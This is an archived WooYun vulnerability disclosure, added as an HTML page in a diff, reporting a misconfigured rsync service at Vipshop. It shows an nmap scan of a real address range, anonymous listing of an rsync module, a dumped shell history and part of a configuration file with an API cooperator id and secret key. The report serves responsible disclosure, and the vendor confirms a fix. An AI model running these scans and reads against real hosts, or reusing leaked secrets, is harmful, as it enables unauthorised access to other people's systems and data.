@@ -1,0 +1,420 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		唯品会rsync导致的信息泄漏漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		唯品会rsync导致的信息泄漏漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/路人甲">路人甲</a> 
+</li><li>提交时间：		2013-01-09 17:32</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-01-09：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-01-11：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-01-21：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-01-31：	细节向普通白帽子公开<br/>
+									2013-02-10：	细节向实习白帽子公开<br/>
+									2013-02-23：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">一个rsync错误设置导致敏感信息泄漏</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">首先呢，扫同网段啊，rsync很多人都没处理好，ping vipshop.com得到一个网段<br />
+<br />
+</p><pre><code>nmap 180.186.22.1/24 -p873 --open<br />
+<br />
+Starting Nmap 5.51 ( http://nmap.org ) at 2013-01-09 16:24 CST<br />
+Nmap scan report for 180.186.22.14<br />
+Host is up (0.0053s latency).<br />
+PORT    STATE SERVICE<br />
+873/tcp open  rsync<br />
+<br />
+Nmap scan report for 180.186.22.22<br />
+Host is up (0.0043s latency).<br />
+PORT    STATE SERVICE<br />
+873/tcp open  rsync</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+好了发现一些了<br />
+<br />
+<br />
+<br />
+</p><pre><code>rsync 180.186.22.14::m2<br />
+drwxr-xr-x        4096 2012/11/15 17:35:00 .<br />
+-rw-------        5433 2012/09/12 13:35:48 .bash_history<br />
+-rw-r--r--          33 2012/05/22 17:18:18 .bash_logout<br />
+-rw-r--r--         176 2012/05/22 17:18:18 .bash_profile<br />
+-rw-r--r--         124 2012/05/22 17:18:18 .bashrc<br />
+-rw-------          32 2012/07/13 10:42:30 .mysql_history<br />
+-rw-------        7708 2012/08/20 17:43:59 .viminfo<br />
+drwx------        4096 2012/07/13 10:44:56 .elinks<br />
+drwxr-xr-x        4096 2012/11/27 00:20:00 360<br />
+drwxr-xr-x        4096 2012/11/23 18:36:42 config<br />
+drwxr-xr-x        4096 2012/09/06 10:27:47 etao<br />
+drwxr-xr-x        4096 2012/12/20 00:30:01 filetemp<br />
+drwxr-xr-x        4096 2012/12/20 00:44:47 log<br />
+drwxr-xr-x        4096 2012/12/20 13:33:19 pictemp</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><pre><code>cat .bash_history <br />
+ls<br />
+ll<br />
+cd /usr/local/tomcat/<br />
+ls<br />
+./bin/shutdown.sh <br />
+netstat -tpln<br />
+./bin/startup.sh <br />
+ll<br />
+cd conf/<br />
+ls<br />
+vim server.xml <br />
+cd ..<br />
+ls<br />
+./bin/shutdown.sh <br />
+./bin/startup.sh <br />
+tail -f logs/catalina.out <br />
+netstat -tpln<br />
+w<br />
+exit<br />
+ls<br />
+cd /usr/local/tomcat/bin/shutdown.sh <br />
+/usr/local/tomcat/bin/shutdown.sh <br />
+/usr/local/tomcat/bin/startup.sh <br />
+netstat -tpln<br />
+netstat -tpln<br />
+cd /usr/local/tomcat/<br />
+ls<br />
+tail -f logs/catalina.out <br />
+vim logs/catalina.out <br />
+vim /etc/hosts<br />
+hostname <br />
+exit<br />
+ls<br />
+/usr/local/tomcat/bin/shutdown.sh <br />
+/usr/local/tomcat/bin/startup.sh <br />
+ls<br />
+netstat -tpln<br />
+netstat -tpln<br />
+netstat -tpln<br />
+netstat -tpln<br />
+cd /usr/local/tomcat/<br />
+ls<br />
+cd logs/<br />
+tail -fn 200 catalina.out <br />
+ls<br />
+netstat -tpln<br />
+vim catalina.out <br />
+ls<br />
+cd ..<br />
+ls<br />
+cd conf/<br />
+ls<br />
+vim tomcat-users.xml <br />
+ls<br />
+vim server.xml <br />
+/usr/local/tomcat/bin/shutdown.sh <br />
+netstat -tpln<br />
+/usr/local/tomcat/bin/startup.sh <br />
+tail -f ../logs/catalina.out <br />
+cd ..<br />
+ls<br />
+vim logs/catalina.out <br />
+vim conf/server.xml <br />
+ls<br />
+vim logs/catalina.out <br />
+vim conf/server.xml <br />
+ls<br />
+vim conf/tomcat-users.xml <br />
+./bin/shutdown.sh <br />
+./bin/startup.sh <br />
+tail -f logs/catalina.out <br />
+vim conf/tomcat-users.xml <br />
+./bin/shutdown.sh <br />
+./bin/startup.sh <br />
+tail -f logs/catalina.out <br />
+vim conf/tomcat-users.xml <br />
+./bin/shutdown.sh <br />
+./bin/startup.sh <br />
+tail -f logs/catalina.out <br />
+ex<br />
+exit<br />
+ls<br />
+/usr/local/tomcat/bin/shutdown.sh <br />
+/usr/local/tomcat/bin/startup.sh <br />
+cd /usr/local/tomcat/<br />
+ls<br />
+cd logs/<br />
+ls<br />
+tail -f catalina.out <br />
+w<br />
+top<br />
+tail -f catalina.out <br />
+tail -f catalina.out <br />
+/usr/local/tomcat/bin/shutdown.sh <br />
+cd /usr/local/tomcat/bin/<br />
+ls<br />
+vim catalina.sh <br />
+ls<br />
+/usr/local/tomcat/bin/startup.sh <br />
+ls<br />
+cd ..<br />
+ls<br />
+tail -f logs/catalina.out <br />
+ls<br />
+cd /data/vipPlatform/<br />
+ls<br />
+vim config/vipshop-config.xml <br />
+ls<br />
+cd ..<br />
+cd /usr/local/tomcat/bin/<br />
+ls<br />
+vim catalina.sh <br />
+/usr/local/tomcat/bin/shutdown.sh <br />
+w<br />
+top<br />
+/usr/local/tomcat/bin/startup.sh <br />
+cd ..<br />
+ls<br />
+tail -f logs/catalina.out <br />
+cd /data/vipMobile/config/<br />
+ls<br />
+vim vipshop-config.xml <br />
+cd /usr/<br />
+ls<br />
+cd cd /usr/local/tomcat/<br />
+ls<br />
+cd /usr/local/tomcat/<br />
+ls<br />
+cd webapps/<br />
+ls<br />
+cd /usr/local/mysql/<br />
+ls<br />
+cd data/<br />
+ls<br />
+top<br />
+/usr/local/tomcat/bin/shutdown.sh <br />
+w<br />
+w<br />
+w<br />
+top<br />
+df -h<br />
+free -m<br />
+df -h<br />
+vim /etc/my.cnf <br />
+/usr/local/tomcat/bin/startup.sh <br />
+cd /usr/local/tomcat/<br />
+ls<br />
+tail -f logs/catalina.out <br />
+/usr/local/tomcat/bin/shutdown.sh <br />
+/usr/local/tomcat/bin/startup.sh <br />
+tail -f logs/catalina.out <br />
+/usr/local/tomcat/bin/shutdown.sh <br />
+/usr/local/tomcat/bin/startup.sh <br />
+tail -f logs/catalina.out <br />
+tail -f logs/catalina.out <br />
+tail -f logs/catalina.out <br />
+w<br />
+top<br />
+tail -f logs/catalina.out <br />
+tail -f logs/catalina.out <br />
+/usr/local/tomcat/bin/shutdown.sh <br />
+/usr/local/tomcat/bin/startup.sh <br />
+tail -f logs/catalina.out <br />
+/usr/local/tomcat/bin/shutdown.sh <br />
+w<br />
+w<br />
+cd /usr/local/tomcat/webapps/<br />
+ls<br />
+ll<br />
+netstat -tpln<br />
+netstat -tpln<br />
+netstat -tpln<br />
+ls<br />
+*.war /tmp/<br />
+mv *.war /tmp/<br />
+ll<br />
+ll<br />
+/usr/local/tomcat/bin/startup.sh <br />
+netstat -tpln<br />
+ll<br />
+rm -rf vipMobile<br />
+chown -R tomcat.tomcat .<br />
+cp ../vipPlatform.war  .<br />
+exit<br />
+ll<br />
+cp /usr/local/tomcat/vipMobile.war  /usr/local/tomcat/webapps/<br />
+cd /usr/local/tomcat/</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><pre><code>cat vipshop-config.xml <br />
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;<br />
+&lt;vipshop-config&gt;<br />
+	&lt;config name=&quot;qqapi&quot;&gt;<br />
+		&lt;publish_to&gt;qq&lt;/publish_to&gt;<br />
+		&lt;cooperatorid&gt;855006109&lt;/cooperatorid&gt;<br />
+		&lt;secretkey&gt;abcdefghabcdefghabcdefghabcdefgh&lt;/secretkey&gt;<br />
+		&lt;add_sku_method&gt;addSKU&lt;/add_sku_method&gt;<br />
+		&lt;add_sku_url&gt;http://apitest.buy.qq.com/item/addSKU.xhtml&lt;/add_sku_url&gt;<br />
+		&lt;add_sku_detail_method&gt;addSKUDetail&lt;/add_sku_detail_method&gt;<br />
+		&lt;add_sku_detail_url&gt;http://apitest.buy.qq.com/item/addSKUDetail.xhtml&lt;/add_sku_detail_url&gt;<br />
+		&lt;add_sku_pic_method&gt;addSKUPic&lt;/add_sku_pic_method&gt;<br />
+		&lt;add_sku_pic_url&gt;http://apitest.buy.qq.com/item/addSKUPic.xhtml&lt;/add_sku_pic_url&gt;<br />
+		&lt;add_sku_stock_method&gt;modifySKUStock&lt;/add_sku_stock_method&gt;<br />
+		&lt;add_sku_stock_url&gt;http://apitest.buy.qq.com/item/modifySKUStock.xhtml&lt;/add_sku_stock_url&gt;<br />
+		&lt;add_sku_batch_stock_method&gt;batchModifySKUStock&lt;/add_sku_batch_stock_method&gt;<br />
+		&lt;add_sku_batch_stock_url&gt;http://apitest.buy.qq.com/item/batchModifySKUStock.xhtml&lt;/add_sku_batch_stock_url&gt;<br />
+		&lt;queryDealList_method&gt;queryDealListV2&lt;/queryDealList_method&gt;<br />
+		&lt;queryDealList_url&gt;http://apitest.buy.qq.com/deal/queryDealListV2.xhtml&lt;/queryDealList_url&gt;<br />
+		&lt;queryDealDetail_method&gt;queryDealDetailV2&lt;/queryDealDetail_method&gt;<br />
+		&lt;queryDealDetail_url&gt;http://apitest.buy.qq.com/deal/queryDealDetailV2.xhtml&lt;/queryDealDetail_url&gt;<br />
+		&lt;signCheckResult_method&gt;signCheckResultV2&lt;/signCheckResult_method&gt;<br />
+		&lt;signCheckResult_url&gt;http://apitest.buy.qq.com/deal/signCheckResultV2.xhtml&lt;/signCheckResult_url&gt;<br />
+		&lt;signShip_method&gt;signShipV2&lt;/signShip_method&gt;<br />
+		&lt;signShip_url&gt;http://apitest.buy.qq.com/deal/signShipV2.xhtml&lt;/signShip_url&gt;<br />
+		&lt;signRecvState_method&gt;signRecvStateV2&lt;/signRecvState_method&gt;<br />
+		&lt;signRecvState_url&gt;http://apitest.buy.qq.com/deal/signRecvStateV2.xhtml&lt;/signRecvState_url&gt;</code></pre><p class='detail'> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"> </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/路人甲" title="路人甲">路人甲</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-017131" title="唯品会rsync导致的信息泄漏漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：3 </p>
+													<p class="detail">确认时间：2013-01-11 14:21</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢提供，已经修复</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="17131";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
